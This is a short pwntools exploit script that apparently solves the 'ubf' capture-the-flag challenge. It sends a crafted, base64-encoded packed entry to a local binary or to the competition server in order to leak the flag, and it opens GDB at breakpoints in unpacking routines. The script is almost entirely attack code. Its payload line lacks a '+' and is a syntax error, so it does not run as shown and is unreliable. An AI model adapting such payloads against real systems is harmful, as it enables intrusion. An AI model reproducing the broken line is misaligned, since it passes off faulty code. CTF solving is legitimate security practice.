#!/usr/bin/python3

from pwn import *
import base64

exe = ELF('ubf', checksec=False)
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
context.binary = exe
# context.terminal = ['tmux', 'splitw', '-h']

info = lambda msg: log.info(msg)
sla = lambda msg, data: r.sendlineafter(msg, data)
sa = lambda msg, data: r.sendafter(msg, data)
sl = lambda data: r.sendline(data)
s = lambda data: r.send(data)
sln = lambda msg, num: sla(msg, str(num).encode())
sn = lambda msg, num: sa(msg, str(num).encode())

def gen_payload(size, type, loop, idx, data):
    return p32(size) + type + p16(loop) + p16(idx) + data

def GDB():
    gdb.attach(r, gdbscript='''
        tbreak main
        # b*main+218
        # b*unpack_entry+302
        b*unpack_strings+299
        c
    ''')


if args.REMOTE:
    r = remote('ubf.2023.ctfcompetition.com', 1337)
else:
    r = process(exe.path)
    GDB()

### size type loop id data
payload = gen_payload(0x100, b's', 1, 2, p16(5)b'$FLAG')
sla(b'encoded:\n', base64.b64encode(payload))

r.interactive()
